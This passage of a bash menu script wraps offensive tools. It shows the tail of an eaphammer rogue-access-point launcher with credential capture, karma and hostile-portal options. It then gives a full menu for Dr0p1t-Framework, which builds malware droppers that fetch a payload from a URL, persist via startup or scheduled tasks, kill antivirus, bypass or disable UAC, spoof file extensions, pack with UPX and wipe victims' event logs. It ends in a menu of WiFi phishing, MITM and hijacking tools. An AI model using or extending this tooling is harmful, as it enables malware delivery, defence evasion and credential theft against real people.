\"$EAPHKARMA\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHKARMA=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHKARMA=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 13 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHAIRCRACK\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tclear\n\t\t\t\t\t\techo -e \"Hostname: \"\n\t\t\t\t\t\tread HOSTN\n\t\t\t\t\t\techo -e \"Port: \"\n\t\t\t\t\t\tread PORT\n\t\t\t\t\t\tclear\n\t\t\t\t\t\tEAPHAIRCRACK=\"\"$HOSTN\":\"$PORT\"\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHAIRCRACK=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 14 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHINTAUTO\" = \"OFF\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHINTAUTO=\"ON\"\n\t\t\t\t\telse\n\t\t\t\t\t\tEAPHINTAUTO=\"OFF\"\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = 15 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$EAPHWORD\" != \"OFF\" && \"$EAPHWORD\" != \"\\e[1;31mNONE\\e[0m\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tEAPHWORD=\"OFF\"\n\t\t\t\t\telse\n\t\t\t\t\t\tclear\n\t\t\t\t\t\techo -e \"Type the full wordlist path: \"\n\t\t\t\t\t\tread EAPHWORD\n\t\t\t\t\tfi\n\t\t\t\telif [[ \"$EAPH\" = \"back\" || \"$EAPH\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$EAPH\" = \"00\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\texec bash $0\n\t\t\t\telif [[ \"$EAPH\" = \"0\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\texit\n\t\t\t\telif [[ \"$EAPH\" = \"start\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$OK1\" != 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"You haven't specified the important requirements\"\n\t\t\t\t\t\tsleep 4\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\t\tif [[ \"$OK2\" != 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"You haven't specified a wordlist for the autocrack\"\n\t\t\t\t\t\tsleep 4\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHCREDS\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tCREDS=\"--creds\"\n\t\t\t\telse\n\t\t\t\t\tCREDS=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHHOSTILE\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tHOSTILE=\"--hostile-portal\"\n\t\t\t\telse\n\t\t\t\t\tHOSTILE=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHCAPTIVE\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tCAPTIVE=\"--captive-portal\"\n\t\t\t\telse\n\t\t\t\t\tCAPTIVE=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHPIVOT\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tPIVOT=\"--pivot\"\n\t\t\t\telse\n\t\t\t\t\tPIVOT=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHKARMA\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tKARMA=\"--karma\"\n\t\t\t\telse\n\t\t\t\t\tKARMA=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHINTAUTO\" = \"ON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tINTAUTO=\"--local-autocrack\"\n\t\t\t\telse\n\t\t\t\t\tINTAUTO=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" != \"OFF\" ]]\n\t\t\t\tthen\n\t\t\t\t\tAIRCRACK=\"--remote-autocrack $EAPHAIRCRACK\"\n\t\t\t\telse\n\t\t\t\t\tAIRCRACK=\"\"\n\t\t\t\tfi\n\t\t\t\tif [[ \"$EAPHAIRCRACK\" != \"OFF\" || \"$EAPHINTAUTO\" != \"OFF\" ]]\n\t\t\t\tthen\n\t\t\t\t\tWORD=\"--wordlist $EAPHWORD\"\n\t\t\t\telse\n\t\t\t\t\tWORD=\"\"\n\t\t\t\tfi\n\t\t\t\tIFACE=\"-i $EAPHIFACE\"\n\t\t\t\tCHANNEL=\"-c $EAPHCHANNEL\"\n\t\t\t\tESSID=\"-e $EAPHESSID\"\n\t\t\t\tBSSID=\"-b $EAPHBSSID\"\n\t\t\t\tWPA=\"--wpa $EAPHWPA\"\n\t\t\t\tAUTH=\"--auth $EAPHAUTH\"\n\t\t\t\t\tcd /root/eaphammer\n\t\t\t\t\t./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD\n\t\t\t\t\t\n\t\t\t\tfi\n\t\t\tdone\n}\nfunction dropit_automation\n{\nclear\nwhile true\ndo\n\tclear\n\tTERMINALTITLE=\"Dr0p1t-Framework\"\n\tdash_calc\n\tprintf '\\033]2;Dr0p1t-Framework\\a'\n\tif [[ \"$MALURL\" = \"\" ]]\n\tthen\n\t\tMALURL=\"\\e[1;31mNONE\\e[0m\"\n\tfi\n\tif [[ \"$STARTUP\" = \"\" ]]\n\tthen\n\t\tSTARTUP=\"OFF\"\n\tfi\n\tif [[ \"$TASK\" = \"\" ]]\n\tthen\n\t\tTASK=\"OFF\"\n\tfi\n\tif [[ \"$LTPUP\" = \"\" ]]\n\tthen\n\t\tLTPUP=\"OFF\"\n\tfi\n\tif [[ \"$KILLANT\" = \"\" ]]\n\tthen\n\t\tKILLANT=\"OFF\"\n\tfi\n\tif [[ \"$RUNBAT\" = \"\" ]]\n\tthen\n\t\tRUNBAT=\"OFF\"\n\tfi\n\tif [[ \"$RUNPOW\" = \"\" ]]\n\tthen\n\t\tRUNPOW=\"OFF\"\n\tfi\n\tif [[ \"$RUNVBS\" = \"\" ]]\n\tthen\n\t\tRUNVBS=\"OFF\"\n\tfi\n\tif [[ \"$UACASADMIN\" = \"\" ]]\n\tthen\n\t\tUACASADMIN=\"OFF\"\n\tfi\n\tif [[ \"$SPOOFEXT\" = \"\" ]]\n\tthen\n\t\tSPOOFEXT=\"OFF\"\n\tfi\n\tif [[ \"$ISZIP\" = \"\" ]]\n\tthen\n\t\tISZIP=\"OFF\"\n\tfi\n\tif [[ \"$COMPRESS\" = \"\" ]]\n\tthen\n\t\tCOMPRESS=\"OFF\"\n\tfi\n\tif [[ \"$DISUAC\" = \"\" ]]\n\tthen\n\t\tDISUAC=\"OFF\"\n\tfi\n\tif [[ \"$ICON\" = \"\" ]]\n\tthen\n\t\tICON=\"OFF\"\n\tfi\n\tif [[ \"$EVENT\" = \"\" ]]\n\tthen\n\t\tEVENT=\"OFF\"\n\tfi\n\tif [[ \"$COMPILE\" = \"\" ]]\n\tthen\n\t\tCOMPILE=\"OFF\"\n\tfi\n\tif [[ \"$D32\" = \"\" ]]\n\tthen\n\t\tD32=\"OFF\"\n\tfi\n\tif [[ \"$D64\" = \"\" ]]\n\tthen\n\t\tD64=\"OFF\"\n\tfi\n\tif [[ \"$BANN\" = \"\" ]]\n\tthen\n\t\tBANN=\"OFF\"\n\tfi\n\techo -e \"\"$YS\" 1\"$CE\") Malware URL                          CURRENT:$MALURL\"\n\techo -e \"\"$YS\" 2\"$CE\") Malware to startup                   CURRENT:$STARTUP\"\n\techo -e \"\"$YS\" 3\"$CE\") Malware to task scheduler            CURRENT:$TASK\"\n\techo -e \"\"$YS\" 4\"$CE\") Add link to powershell user profile  CURRENT:$LTPUP\"\n\techo -e \"\"$YS\" 5\"$CE\") Kill antivirus before malware        CURRENT:$KILLANT\"\n\techo -e \"\"$YS\" 6\"$CE\") Run batch script before malware      CURRENT:$RUNBAT\"\n\techo -e \"\"$YS\" 7\"$CE\") Run powershell script before malware CURRENT:$RUNPOW\"\n\techo -e \"\"$YS\" 8\"$CE\") Run vbs script before malware        CURRENT:$RUNVBS\"\n\techo -e \"\"$YS\" 9\"$CE\") Bypass UAC and run malware as admin  CURRENT:$UACASADMIN\"\n\techo -e \"\"$YS\"10\"$CE\") Spoof final file to an extension     CURRENT:$SPOOFEXT\"\n\techo -e \"\"$YS\"11\"$CE\") Malware is zip compressed            CURRENT:$ISZIP\"\n\techo -e \"\"$YS\"12\"$CE\") Compress the final file with UPX     CURRENT:$COMPRESS\"\n\techo -e \"\"$YS\"13\"$CE\") Try to disable UAC on victim device  CURRENT:$DISUAC\"\n\techo -e \"\"$YS\"14\"$CE\") Use icon to the final file           CURRENT:$ICON\"\n\techo -e \"\"$YS\"15\"$CE\") Don't clean target's event log       CURRENT:$EVENT\"\n\techo -e \"\"$YS\"16\"$CE\") Don't compile the final file         CURRENT:$COMPILE\"\n\techo -e \"\"$YS\"17\"$CE\") Download malware for 32 bit only     CURRENT:$D32\"\n\techo -e \"\"$YS\"18\"$CE\") Download malware for 64 bit only     CURRENT:$D64\"\n\techo -e \"\"$YS\"19\"$CE\") Stay quite(no banner)                CURRENT:$BANN\"\n\techo -e \"\"$YS\" o\"$CE\") Open output folder\"\n\techo -e \"\"$YS\" u\"$CE\") Check for updates\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\"start\"$CE\") Generate\"\n\techo -e \"Choose: \"\n\tread DR\n\tclear\n\tif [[ \"$DR\" = \"o\" ]]\n\tthen\n\t\tgio open /root/Dr0p1t-Framework/output\n\t\tcontinue\n\tfi\n\tif [[ \"$DR\" = \"u\" ]]\n\tthen\n\t\tcd /root/Dr0p1t-Framework\n\t\tpython Dr0p1t.py -u\n\t\tcd\n\t\tcontinue\n\tfi\n\tif [[ \"$DR\" = \"start\" ]]\n\tthen\n\t\tif [[ \"$MALURL\" = \"\\e[1;31mNONE\\e[0m\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No URL specified.\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$STARTUP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDSTARTUP=\"\"\n\t\telse\n\t\t\tDSTARTUP=\"-s\"\n\t\tfi\n\t\tif [[ \"$TASK\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDTASK=\"\"\n\t\telse\n\t\t\tDTASK=\"-t\"\n\t\tfi\n\t\tif [[ \"$LTPUP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDLTPUP=\"\"\n\t\telse\n\t\t\tDLTPUP=\"-a\"\n\t\tfi\n\t\tif [[ \"$KILLANT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDKILLANT=\"\"\n\t\telse\n\t\t\tDKILLANT=\"-k\"\n\t\tfi\n\t\tif [[ \"$RUNBAT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDRUNBAT=\"\"\n\t\telse\n\t\t\tDRUNBAT=\"-b $RUNBAT\"\n\t\tfi\n\t\tif [[ \"$RUNPOW\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDRUNPOW=\"\"\n\t\telse\n\t\t\tDRUNPOW=\"-p $RUNPOW\"\n\t\tfi\n\t\tif [[ \"$RUNVBS\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDRUNVBS=\"\"\n\t\telse\n\t\t\tDRUNVBS=\"-v $RUNVBS\"\n\t\tfi\n\t\tif [[ \"$UACASADMIN\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDUACASADMIN=\"\"\n\t\telse\n\t\t\tDUACASADMIN=\"--runas\"\n\t\tfi\n\t\tif [[ \"$SPOOFEXT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDSPOOFEXT=\"\"\n\t\telse\n\t\t\tDSPOOFEXT=\"--spoof $SPOOFEXT\"\n\t\tfi\n\t\tif [[ \"$ISZIP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDISZIP=\"\"\n\t\telse\n\t\t\tDISZIP=\"--zip\"\n\t\tfi\n\t\tif [[ \"$COMPRESS\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDCOMPRESS=\"\"\n\t\telse\n\t\t\tDCOMPRESS=\"--upx\"\n\t\tfi\n\t\tif [[ \"$DISUAC\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDDISUAC=\"\"\n\t\telse\n\t\t\tDDISIAC=\"--nouac\"\n\t\tfi\n\t\tif [[ \"$ICON\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDICON=\"\"\n\t\telse\n\t\t\tDICON=\"-i $ICON\"\n\t\tfi\n\t\tif [[ \"$EVENT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDEVENT=\"\"\n\t\telse\n\t\t\tDEVENT=\"--noclearevent\"\n\t\tfi\n\t\tif [[ \"$COMPILE\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDCOMPILE=\"\"\n\t\telse\n\t\t\tDCOMPILE=\"--nocompile\"\n\t\tfi\n\t\tif [[ \"$D32\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDD32=\"\"\n\t\telse\n\t\t\tDD32=\"--only32\"\n\t\tfi\n\t\tif [[ \"$D64\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDD64=\"\"\n\t\telse\n\t\t\tDD64=\"--only64\"\n\t\tfi\n\t\tif [[ \"$BANN\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDBANN=\"\"\n\t\telse\n\t\t\tDBANN=\"-q\"\n\t\tfi\n\t\tcd /root/Dr0p1t-Framework\n\t\tpython Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\tcd\n\telif [[ \"$DR\" = 1 ]]\n\tthen\n\t\techo -e \"Malware URL: \"\n\t\tread MALURL\n\telif [[ \"$DR\" = 14 ]]\n\tthen\n\t\tif [[ \"$ICON\" = \"OFF\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\techo -e \"\"$RS\"Icon must be on /root/Dr0p1t-Framework/icons folder.\"$CE\"\"\n\t\t\t\techo -e \"\"\n\t\t\t\tls -1 /root/Dr0p1t-Framework/icons/\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"\"$YS\"cp\"$CE\") Copy my icon to that folder\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Enter the name of your icon: \"\n\t\t\t\tread ICON\n\t\t\t\tif [[ \"$ICON\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tICON=\"OFF\"\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$ICON\" = \"m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Your file path: \"\n\t\t\t\t\tread FP\n\t\t\t\t\tif [[ ! -f \"$FP\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File does not exist.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tcp \"$FP\" /root/Dr0p1t-Framework/icons/\n\t\t\t\t\tfi\n\t\t\t\telif [[ ! -f /root/Dr0p1t-Framework/icons/\"$ICON\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ ! -f /root/Dr0p1t-Framework/icons/\"$ICON\".ico ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tICON=\"\"$ICON\".ico\"\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\tICON=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 8 ]]\n\tthen\n\t\tif [[ \"$RUNVBS\" = \"OFF\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\techo -e \"\"$RS\"Script must be on /root/Dr0p1t-Framework/scripts/vbs folder.\"$CE\"\"\n\t\t\t\techo -e \"\"\n\t\t\t\tls -1 /root/Dr0p1t-Framework/scripts/vbs/\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"\"$YS\"cp\"$CE\") Copy my script to that folder\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Enter the name of your script: \"\n\t\t\t\tread RUNVBS\n\t\t\t\tif [[ \"$RUNVBS\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tRUNVBS=\"OFF\"\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$RUNVBS\" = \"m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Your file path: \"\n\t\t\t\t\tread FP\n\t\t\t\t\tif [[ ! -f \"$FP\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File does not exist.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tcp \"$FP\" /root/Dr0p1t-Framework/scripts/vbs/\n\t\t\t\t\tfi\n\t\t\t\telif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/\"$RUNVBS\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/\"$RUNVBS\".vbs ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tRUNVBS=\"\"$RUNVBS\".vbs\"\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\tRUNVBS=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 7 ]]\n\tthen\n\t\tif [[ \"$RUNPOW\" = \"OFF\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\techo -e \"\"$RS\"Script must be on /root/Dr0p1t-Framework/scripts/powershell folder.\"$CE\"\"\n\t\t\t\techo -e \"\"\n\t\t\t\tls -1 /root/Dr0p1t-Framework/scripts/powershell/\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"\"$YS\"cp\"$CE\") Copy my script to that folder\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Enter the name of your script: \"\n\t\t\t\tread RUNPOW\n\t\t\t\tif [[ \"$RUNPOW\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tRUNPOW=\"OFF\"\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$RUNPOW\" = \"m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Your file path: \"\n\t\t\t\t\tread FP\n\t\t\t\t\tif [[ ! -f \"$FP\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File does not exist.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tcp \"$FP\" /root/Dr0p1t-Framework/scripts/powershell/\n\t\t\t\t\tfi\n\t\t\t\telif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/\"$RUNPOW\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/\"$RUNPOW\".ps1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tRUNPOW=\"\"$RUNPOW\".ps1\"\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\tRUNPOW=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 6 ]]\n\tthen\n\t\tif [[ \"$RUNBAT\" = \"OFF\" ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\techo -e \"\"$RS\"Script must be on /root/Dr0p1t-Framework/scripts/bat folder.\"$CE\"\"\n\t\t\t\techo -e \"\"\n\t\t\t\tls -1 /root/Dr0p1t-Framework/scripts/bat/\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"\"$YS\"cp\"$CE\") Copy my script to that folder\"\n\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\techo -e \"Enter the name of your script: \"\n\t\t\t\tread RUNBAT\n\t\t\t\tif [[ \"$RUNBAT\" = \"b\" ]]\n\t\t\t\tthen\n\t\t\t\t\tRUNBAT=\"OFF\"\n\t\t\t\t\tbreak\n\t\t\t\telif [[ \"$RUNBAT\" = \"m\" ]]\n\t\t\t\tthen\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Your file path: \"\n\t\t\t\t\tread FP\n\t\t\t\t\tif [[ ! -f \"$FP\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File does not exist.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tcp \"$FP\" /root/Dr0p1t-Framework/scripts/bat/\n\t\t\t\t\tfi\n\t\t\t\telif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/\"$RUNBAT\" ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/\"$RUNBAT\".bat ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File not found.\"$CE\"\"\n\t\t\t\t\t\tsleep 2\n\t\t\t\t\telse\n\t\t\t\t\t\tRUNBAT=\"\"$RUNBAT\".bat\"\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tdone\n\t\telse\n\t\t\tRUNBAT=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 2 ]]\n\tthen\n\t\tif [[ \"$STARTUP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tSTARTUP=\"ON\"\n\t\telse\n\t\t\tSTARTUP=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 3 ]]\n\tthen\n\t\tif [[ \"$TASK\" = \"OFF\" ]]\n\t\tthen\n\t\t\tTASK=\"ON\"\n\t\telse\n\t\t\tTASK=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 4 ]]\n\tthen\n\t\tif [[ \"$LTPUP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tLTPUP=\"ON\"\n\t\telse\n\t\t\tLTPUP=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 5 ]]\n\tthen\n\t\tif [[ \"$KILLANT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tKILLANT=\"ON\"\n\t\telse\n\t\t\tKILLANT=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 9 ]]\n\tthen\n\t\tif [[ \"$UACASADMIN\" = \"OFF\" ]]\n\t\tthen\n\t\t\tUACASADMIN=\"ON\"\n\t\telse\n\t\t\tUACASADMIN=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 10 ]]\n\tthen\n\t\tif [[ \"$SPOOFEXT\" = \"OFF\" ]]\n\t\tthen\n\t\t\techo -e \"Extension: \"\n\t\t\tread SPOOFEXT\n\t\telse\n\t\t\tSPOOFEXT=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 11 ]]\n\tthen\n\t\tif [[ \"$ISZIP\" = \"OFF\" ]]\n\t\tthen\n\t\t\tISZIP=\"ON\"\n\t\telse\n\t\t\tISZIP=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 12 ]]\n\tthen\n\t\tif [[ \"$COMPRESS\" = \"OFF\" ]]\n\t\tthen\n\t\t\tCOMPRESS=\"ON\"\n\t\telse\n\t\t\tCOMPRESS=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 13 ]]\n\tthen\n\t\tif [[ \"$DISUAC\" = \"OFF\" ]]\n\t\tthen\n\t\t\tDISUAC=\"ON\"\n\t\telse\n\t\t\tDISUAC=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 15 ]]\n\tthen\n\t\tif [[ \"$EVENT\" = \"OFF\" ]]\n\t\tthen\n\t\t\tEVENT=\"ON\"\n\t\telse\n\t\t\tEVENT=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 16 ]]\n\tthen\n\t\tif [[ \"$COMPILE\" = \"OFF\" ]]\n\t\tthen\n\t\t\tCOMPILE=\"ON\"\n\t\telse\n\t\t\tCOMPILE=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 17 ]]\n\tthen\n\t\tif [[ \"$D32\" = \"OFF\" ]]\n\t\tthen\n\t\t\tD32=\"ON\"\n\t\telse\n\t\t\tD32=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 18 ]]\n\tthen\n\t\tif [[ \"$D64\" = \"OFF\" ]]\n\t\tthen\n\t\t\tD64=\"ON\"\n\t\telse\n\t\t\tD64=\"OFF\"\n\t\tfi\n\telif [[ \"$DR\" = 19 ]]\n\tthen\n\t\tif [[ \"$BANN\" = \"OFF\" ]]\n\t\tthen\n\t\t\tBANN=\"ON\"\n\t\telse\n\t\t\tBANN=\"OFF\"\n\t\tfi\n\tfi\ndone\n}\nfunction wifi_tools\n{\n\twhile true\n\tdo\n\tprintf '\\033]2;WIFI TOOLS\\a'\n\tclear\n\tTERMINALTITLE=\"WIFI TOOLS\"\n\tdash_calc\n\tif [[ -d /root/fluxion ]]\n\tthen\n\t\techo -e \"\"$YS\" 1\"$CE\") Fluxion               The future of MITM WPA attacks\"\n\telse\n\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"Fluxion\"$CE\"               The future of MITM WPA attacks\"\n\tfi\n\tif [[ $(which wifite) ]]\n\tthen\n\t\techo -e \"\"$YS\" 2\"$CE\") Wifite                Automated wireless attack tool\"\n\telse\n\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"Wifite\"$CE\"               Automated wireless attack tool\"\n\tfi\n\tif [[ -d /root/wifiphisher ]]\n\tthen\n\t\techo -e \"\"$YS\" 3\"$CE\") Wifiphisher           Automated phishing attacks against Wi-Fi clients\"\n\telse\n\t\techo -e \"\"$RS\" 3\"$CE\") \"$RS\"Wifiphisher\"$CE\"           Automated phishing attacks against Wi-Fi clients\"\n\tfi\n\tif [[ -d /root/Zatacker ]]\n\tthen\n\t\techo -e \"\"$YS\" 4\"$CE\") Zatacker              MITM-NMAP-Mail Spammer..(Install it manually)\"\n\telse\n\t\techo -e \"\"$RS\" 4\"$CE\") \"$RS\"Zatacker\"$CE\"              MITM-NMAP-Mail Spammer..(Install it manually)\"\n\tfi\n\tif [[ -d /root/morpheus ]]\n\tthen\n\t\techo -e \"\"$YS\" 5\"$CE\") Morpheus              Automated Ettercap TCP/IP Hijacking Tool\"\n\telse\n\t\techo -e \"\"$RS\" 5\"$CE\") \"$RS\"Morpheus\"$CE\"              Automated Ettercap TCP/IP Hijacking Tool\"\n\tfi\n\t#~ if [[ -d /root/osrframework ]]\n\t#~ then\n\t\t#~ echo -e \"\"$YS\" 6\"$CE\") Osrfconsole           Checks usernames-phones to platforms etc..\"\n\t#~ else\n\t\t#~ echo -e \"\"$RS\" 6\"$CE\") \"$RS\"Osrfconsole\"$CE\"           Checks usernames-phones to platforms etc..\"\n\t#~ fi\n\tif [[ -d /root/opensource ]]\n\tthen\n\t\techo -e \"\"$YS\" 6\"$CE\") Netool-toolkit        MitM pentesting opensource toolkit\"\n\telse\n\t\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Netool-toolkit\"$CE\"        MitM pentesting opensource toolkit\"\n\tfi\n\tif [[ -d /root/hakkuframework ]]\n\tthen\n\t\techo -e \"\"$YS\" 7\"$CE\") Hakku                 Penetration testing tools\"\n\telse\n\t\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"Hakku\"$CE\"                 Penetration testing tools\"\n\tfi\n\tif [[ -d /root/Trity ]]\n\tthen\n\t\techo -e \"\"$YS\" 8\"$CE\") Trity                 Advanced pentesting framework\"\n\telse\n\t\techo -e \"\"$RS\" 8\"$CE\") \"$RS\"Trity\"$CE\"                 Advanced pentesting framework\"\n\tfi\n\tif [[ -d /root/Dracnmap ]]\n\tthen\t\t\t\t\n\t\techo -e \"\"$YS\" 9\"$CE\") Dracnmap              Many scan options\"\n\telse\n\t\techo -e \"\"$RS\" 9\"$CE\") \"$RS\"Dracnmap\"$CE\"              Many scan options\"\n\tfi\n\tif [[ -d 